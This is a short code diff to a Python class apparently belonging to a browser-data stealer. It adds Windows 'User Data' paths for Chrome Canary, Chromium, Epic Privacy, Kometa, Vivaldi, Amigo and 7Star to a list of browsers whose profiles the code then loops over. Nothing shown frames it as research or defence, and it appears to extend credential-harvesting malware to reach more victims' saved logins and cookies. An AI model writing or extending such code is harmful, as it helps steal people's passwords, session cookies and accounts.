@@ -65,8 +65,14 @@ class QuicaxdExela:
             'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
             'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
             'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
+            'Chrome Canary' :self.local_app_data + os.path.join("\Google", "Chrome SxS","User Data"),
+            'Chromium' :self.local_app_data + os.path.join("\Google", "Chromium","User Data"),
+            'Epic Privacy' :self.local_app_data + os.path.join("\Epic Privacy Browser","User Data"),
+            'Cometa' :self.local_app_data + os.path.join("\Kometa","User Data"),
+            'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),
+            'Amigo' : self.local_app_data + os.path.join("\Amigo","User Data"),
+            '7Star': self.local_app_data + os.path.join("\7Star", "\7Star", "User Data"),
             
-            #'Vivaldi' : self.roaming_app_data + os.path.join("\Vivaldi","User Data"),
         }
         for _,path in full_browsers.items():
             for f in profiles:
